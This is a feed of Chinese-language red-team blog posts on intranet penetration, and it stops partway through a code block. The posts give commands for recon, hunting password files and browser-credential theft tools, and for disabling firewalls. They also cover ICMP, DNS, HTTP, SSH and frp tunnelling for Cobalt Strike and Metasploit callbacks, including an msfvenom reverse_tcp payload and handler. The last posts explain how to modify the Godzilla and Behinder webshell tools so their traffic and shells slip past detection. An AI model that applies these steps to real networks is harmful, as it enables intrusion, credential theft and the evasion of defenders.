        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p><a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a></p><p><a href="https://cloud.tencent.com/developer/article/2204689">https://cloud.tencent.com/developer/article/2204689</a><br><a href="https://www.cnblogs.com/riyir/p/12593856.html">https://www.cnblogs.com/riyir/p/12593856.html</a></p><p>查询操作系统的信息,补丁信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systeminfo</span></span><br></pre></td></tr></table></figure><p>setspn技术<br>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供遍历，微软给域内的每种资源分配了不同服务主题名称为即SPN</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br><span class="line">setspn -T god.org -q */*</span><br></pre></td></tr></table></figure><p>windows2003之前</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable   #关闭防火墙</span><br></pre></td></tr></table></figure><p>windows2003之后<br>查询防火墙状态</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles state</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  #关闭防火墙</span><br></pre></td></tr></table></figure><p>防火墙规则 </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all</span><br></pre></td></tr></table></figure><p>查看端口：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>杀软的发现：<br><a href="https://github.com/wwl012345/AVCheck">https://github.com/wwl012345/AVCheck</a></p><p>使用命令收集各类敏感密码配置文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /s user.*,pass.*,config.*,username.*password.*</span><br></pre></td></tr></table></figure><p>使用命令查找某个文件的某个字段</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">findstr</span> /c:&quot;user&quot; /c:&quot;pass&quot; /si *.txt</span><br></pre></td></tr></table></figure><p>找出所有包含password的文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">findstr</span> /si password *.inc *.config *.ini *.txt *.asp *,aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure><h2 id="本机凭证扫描："><a href="#本机凭证扫描：" class="headerlink" title="本机凭证扫描："></a>本机凭证扫描：</h2><p><strong>HackBrowserData</strong><br><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>HackBrowserData是一款命令行工具，用于解密和导出浏览器中的数据（密码、历史记录、Cookie、书签、信用卡信息、下载历史记录、本地存储和扩展程序）。它支持市面上最流行的浏览器，并可在 Windows、macOS 和 Linux 上运行。</p><p><strong>Searchcall</strong><br>可以快速搜索服务器中的有关username，passsword,账号，口令的敏感信息还有浏览器的账户密码。<br><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a></p><p><strong>Pillager</strong><br>Pillager 是一种从目标计算机导出和解密有用数据的工具。<br><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></p><h2 id="对外打点扫描"><a href="#对外打点扫描" class="headerlink" title="对外打点扫描"></a>对外打点扫描</h2><p><strong>Fscan</strong><br>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p><strong>Template</strong><br>提供安全评估和漏洞扫描等相关服<br><a href="https://github.com/1n7erface/Template">https://github.com/1n7erface/Template</a></p><h2 id="AD域环境"><a href="#AD域环境" class="headerlink" title="AD域环境"></a>AD域环境</h2><h3 id="1，Adfind"><a href="#1，Adfind" class="headerlink" title="1，Adfind"></a>1，<strong>Adfind</strong></h3><p>在域环境下非常强大的信息收集工具<br><a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a><br>域用户查询：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -users name</span><br><span class="line">Adfind.exe -sc u:webadmin</span><br></pre></td></tr></table></figure><p>域用户组查询：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -f &quot;objectcategory=computer&quot;</span><br><span class="line">Adfind.exe -f &quot;objectcategory=computer&quot; dn</span><br></pre></td></tr></table></figure><p>查询所有GPO：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -sc gpodmp</span><br></pre></td></tr></table></figure><p>查询域内委派：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//m</span>p.weixin.qq.com<span class="regexp">/s/</span>WrUyPPBAIE-zmC3CfLYS7Q</span><br></pre></td></tr></table></figure><h3 id="2，BloodHound"><a href="#2，BloodHound" class="headerlink" title="2，BloodHound"></a>2，<strong>BloodHound</strong></h3><p>可视化图形分析域环境中的关系的工具<br>BloodHound 使用图论来揭示 Active Directory 或 Azure 环境中隐藏且通常非预期的关系。攻击者可以使用 BloodHound 快速识别原本无法发现的高度复杂的攻击路径。防御者可以使用 BloodHound 识别并消除相同的攻击路径。红蓝双方都可以使用 BloodHound 来更好地理解 Active Directory 或 Azure 环境中的特权关系。</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网-隧道技术</title>
      <link href="/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-1/"/>
      <url>/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-1/</url>
      
        <content type="html"><![CDATA[<h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><p>常见的隧道技术：<br>利用各种隧道技术，以网络防火墙允许的协议，<br>绕过网络防火墙的封锁，实现访问被封锁的目标网络<br>网络层：IPv6 隧道 ，ICMP隧道<br>传输层：TCP 隧道，UDP 隧道，常规端口转发<br>应用层：SSH 隧道，HTPP&#x2F;S 隧道， DNS 隧道</p><p>协议    判断命令<br>ICMP    ping ip or domain<br>HTTP    curl ip or domain<br>SSH     ssh ip or domain<br>DNS     nslookup domain<br>TCP     telnet ip port<br>…     …………</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>工具：<br><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br>IMCP 通过 PING 命令访问远程计算机，建立ICMP隧道将 TCP&#x2F;UDP 数据封装到 ICMP 的 PING 数据包中，从而传过防火请，防火请一般不会屏蔽PING数据包，实现不受限制的访问。<br>应用场景：80为入口权限点，ICMP为上线突破口<br>使用场景：目标入站正向被拦截，出站有ICMP出网<br>排查出网协议：curl nslookuo ping 等命令<br>CS上线：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务端：</span><br><span class="line">./pingtunnel -<span class="keyword">type</span> <span class="type">server</span></span><br><span class="line"><span class="type"></span>客户端：</span><br><span class="line">将本地的TCP端口<span class="number">6666</span>流量转发到<span class="number">192.168</span>.<span class="number">139.141</span>:<span class="number">7777</span>上面（TCP流量封装icmp转发的）</span><br><span class="line">pingtunnel -<span class="keyword">type</span> <span class="type">client </span>-l :<span class="number">6666</span> -s <span class="number">192.168</span>.<span class="number">139.141</span> -t <span class="number">192.168</span>.<span class="number">139.141</span>:<span class="number">7777</span> -tcp <span class="number">1</span> -noprint <span class="number">1</span> -nolog <span class="number">1</span></span><br></pre></td></tr></table></figure><p>监听：<br>127.0.0.1 6666（后门生成）<br>192.168.139.141 7777 （监听上线）</p><p>MSF：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel -type client -l :3333 -s 192.168.139.141 -t 192.168.139.141:3344 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f exe -omsf.exe</span><br></pre></td></tr></table></figure><p>监听器配置：<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp<br>set lhost 0.0.0.0<br>set lport 3344<br>run</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>应用场景：80为入口权限点，DNS为上线突破口<br>适用场景：目标入站正向被拦截，出站有DNS出网<br>域名设置如下：<br>一条A记录指向CS的IP地址<br>vpn.test.site &#x3D;&gt; CS的IP地址<br>几条NS记录指向刚刚A记录对应的域名（也可以只写一条）<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20224708.png"></p><p>随便一台电脑上ping绑定的域名 ，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。</p><p>CS:<br>官网的用法：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-12%20225210.png"><br>写入NS的记录</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checkin</span><br><span class="line"><span class="built_in">mode</span> dns-txt</span><br></pre></td></tr></table></figure><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>SMB一般在防火墙入站默认开启的，判断目标端口是否开放<br>使用场景：防火墙放行的入口打不下利用放行的SMB移动获取权限<br>利用条件：密码喷射或已知口令的情况下直接正向SMB横向移动拿下</p><h2 id="端口转发穿透内网"><a href="#端口转发穿透内网" class="headerlink" title="端口转发穿透内网"></a>端口转发穿透内网</h2><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a><br>1,Pingtunnel配合iox代理Socks内网穿透（防火墙只让ICMP出）<br>2,dnscat2（DNS）配合上线（防火墙只让DNS出）<br><strong>注意：在实战中碰到此情况，说明此电脑的用处不大基本那些weshell就到此结束了。</strong><br>C2:<br>接收客户端传递的ICMP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server -noprint 1 -nolog 1 -key 0000000</span><br></pre></td></tr></table></figure><p>将本地4433转到5566端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./iox proxy -l 4455 -l 5566</span><br></pre></td></tr></table></figure><p>Web<br>将本地2222的TCP封装ICMP给193.168.139.141:4455</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel -type client l 127.0.0.1 -s 192.168.139.141 -t 193.168.139.141:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure><p>建立Socks节点绑定3389端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox.exe proxy -r 127.0.0.1:2222</span><br></pre></td></tr></table></figure><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br>设置密码生成隧道。(aspx|ashx|jsp|jspx|php)并上传到WEB服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure><p>使用neoreg.py连接WEB服务器，在本地建立socks5代理</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">python3 neoreg.py -k password -u http://xx/tunnel.php</span></span><br><span class="line"><span class="section">+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="code">  Log Level set to [DEBUG]</span></span><br><span class="line"><span class="code">  Starting socks server [127.0.0.1:1080]</span></span><br><span class="line"><span class="code">  Tunnel at:</span></span><br><span class="line"><span class="section">    http://xx/tunnel.php</span></span><br><span class="line"><span class="section">+------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure><p>其他工具：<br>哥斯拉，冰蝎<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-13%20155446.png"></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>使用场景：内网主机防火墙限制了出网协议，可以利用SSH转发流量实现内网穿透<br>条件:<br>被控主机需要支持SSH协议(Windwos需要安装支持软件)<br>将2.22主机上80端口流量转发到xx.xx上的1234端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -cfNg -R 1234:192.168.2.22:80 root@xx.xx.xx.xx</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure><h2 id="frp穿透"><a href="#frp穿透" class="headerlink" title="frp穿透"></a>frp穿透</h2><p><a href="https://github.com/fatedier/frp/releases/tag/v0.62.1">https://github.com/fatedier/frp/releases/tag/v0.62.1</a><br>在公网主机上修改frps.toml，设置bindPortfrp客户端的连接：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.toml</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.toml</span><br></pre></td></tr></table></figure><p>尝试将远程服务器的6666 转到 127.0.0.1 5555 采用tcp协议<br>攻击机frpc.toml修改，将serverAddr字段设置为的frps服务器的公网IP地址：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.toml</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">5555</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.toml</span><br></pre></td></tr></table></figure><p>如何利用这种情况实现c2上线<br>监听器1：47.23.291.34 6666端口<br>监听器2：192.168.139.141 5555端口<br>生成后门用监听器1<br>后门-&gt;47.23.291.34:6666-&gt;frp 192.168.139.141:5555-&gt;监听器2-&gt;正常上线</p><p>信息收集：<br>1，建立socks节点做信息收集<br>对方内网主机frpc.ini配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xx.xx.xx.xx  公网服务器IP地址</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">tls_enable</span> = <span class="literal">true</span> </span><br><span class="line"><span class="attr">pool_count</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span>  <span class="comment">#将远程服务端的6000端口成为socks代理</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin@<span class="number">123</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = ture</span><br></pre></td></tr></table></figure><p>公网服务端frps.ini配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span>           <span class="comment">#web面板</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin@<span class="number">123</span></span><br><span class="line"><span class="attr">log_frp</span> = /var/log/frps.log</span><br><span class="line"><span class="attr">log_level</span> = info </span><br><span class="line"><span class="attr">log_max_days</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">authentication_timeout</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">max_pool_count</span> = <span class="number">50</span></span><br></pre></td></tr></table></figure><p>本地在使用proxifier配置公网的ip为socks代理，端口为6000<br>实战场景：拿到webshell但是上线不了cs（出入站的阻止），要对主机的内部网络进行信息收集打点，无法采用cs上面的socks节点去操作  上传至控制机器 frpc 创建socks节点<br>条件：出站没有限制</p><p>2，端口映射转发做信息收集<br>条件：入站没有限制<br>尝试将远程服务端的8888转发映射到192.168.2.22 80<br>被控制机frpc.ini配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;xx.xx.xx.xx&quot;</span>  <span class="comment">#公网服务器</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;192.168.2.22&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="NPS穿透"><a href="#NPS穿透" class="headerlink" title="NPS穿透"></a>NPS穿透</h2><p>一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发，可用来访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等……，并带有功能强大的web管理端。<br><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改哥斯拉</title>
      <link href="/2025/06/17/%E9%AD%94%E6%94%B9%E5%93%A5%E6%96%AF%E6%8B%89/"/>
      <url>/2025/06/17/%E9%AD%94%E6%94%B9%E5%93%A5%E6%96%AF%E6%8B%89/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀对抗-2"><a href="#免杀对抗-2" class="headerlink" title="免杀对抗-2"></a>免杀对抗-2</h1><h2 id="魔改哥斯拉"><a href="#魔改哥斯拉" class="headerlink" title="魔改哥斯拉"></a>魔改哥斯拉</h2><p>流量特征修改：<br>1，抓包分析特征流量<br>2，特征对应的代码段<br>3，修改代码段打扰魔改</p><p>官网下载jar文件：<br><a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla</a><br>反编译jar：<br><a href="https://www.decompiler.com/">https://www.decompiler.com/</a><br>idea自带的反编译工具</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="operator">-</span>cp <span class="string">&quot;D:<span class="char escape_">\P</span>rogram Files<span class="char escape_">\J</span>etBrains<span class="char escape_">\I</span>ntelliJ IDEA 2025.1.1.1<span class="char escape_">\p</span>lugins<span class="char escape_">\j</span>ava-decompiler<span class="char escape_">\l</span>ib<span class="char escape_">\j</span>ava-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler <span class="operator">-</span>dgs<span class="operator">=</span><span class="literal">true</span> Godzilla.jar godzilla_src</span><br></pre></td></tr></table></figure><p>打开idea新建项目，并将反编译的文件放入项目中<br>创建lib文件（放入Godzilla.jar）<br>在项目结构中导入模块和工作件<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20182524.png"><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20182959.png"><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20183040.png"></p><p>更改文件后重新构建后运行后报错：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20183353.png"><br>所以需要更改一下其他地方<br>搜索报错内容的关键字<br>查到此文件：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20185450.png"><br>将校验内容注释：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20190115.png"><br>重新构建，将报错的文件直接删掉就行。</p><h3 id="更改强特征："><a href="#更改强特征：" class="headerlink" title="更改强特征："></a>更改强特征：</h3><p>1，分析数据包<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20190950.png"><br>User-Agent,Accept,Accpet-Language，Post内容，为强特征，需要更改内容<br>更改内容处：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20191406.png"><br>下面还有更新函数：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20192457.png"><br>强制将跟新的内容换成我们更改的</p><h3 id="Webshell生成"><a href="#Webshell生成" class="headerlink" title="Webshell生成"></a>Webshell生成</h3><p>生成shell的代码处：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-08%20193314.png"><br>在此处为源代码<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-09%20012142.png"><br>打开工具生成一个shell.php,并将代码使用XG_拟态工具进行免杀加密<br>在将.bin文件的代码替换后，重新构建生成即可</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改冰蝎</title>
      <link href="/2025/06/17/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/"/>
      <url>/2025/06/17/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀对抗-1"><a href="#免杀对抗-1" class="headerlink" title="免杀对抗-1"></a>免杀对抗-1</h1><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><p><a href="http://bypass.tidesec.com/">http://bypass.tidesec.com/</a><br><strong>原理：</strong><br>1，webshell工具里面的后门代码不被病毒检测到-混淆<br>2，webshell工具里面的功能操作不被杀毒拦截到-魔改<br>3，webshell工具里面的操作连接不被平台捕获到-魔改</p><p>通过对冰蝎的数据包分析：<br>1，请求数据包的两个强特征<br>2，已知数据的提交内容加密算法<br>流量平台设备可以分析数据包的两个强特征<br>提交数据进行默认算法解密去分析是否为冰蝎工具连接<br>数据包特征：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20183226.png"><br>application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p><p>解决1：绕过识别（魔改打乱特征，新增加密算法）<br>解决2：绕过查杀（魔改打乱特征，新增加密算法）</p><h3 id="魔改冰蝎"><a href="#魔改冰蝎" class="headerlink" title="魔改冰蝎"></a>魔改冰蝎</h3><p>JAR反编译打包架构<br>1，反编译Jar<br><a href="https://www.decompiler.com/">https://www.decompiler.com/</a><br>在idea中新建一个项目<br>创建lib目录<br>将Behinder文件原有的内容放入进去<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20211335.png"><br>并将反编译的文件也放入到文件中<br>在项目结构中加入<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20211639.png"><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20211723.png"><br>在文件中查找特征<br>application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01<br>Accept-Language:zh-CN,zh; q&#x3D;0.9,en-US;q&#x3D;0.8,en;g&#x3D;0.7<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20184131.png"><br>更改加密特征<br>查看加密算法,随意选择一个加密算法，复制其中的代码段，到文件中去查找位置<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210645.png"><br>路径：\net\rebeyond\behinder\resource\transprotocol<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210312.png"><br>只需要将需要更改的内容放入到src目录中<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20212027.png"></p><p>加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span 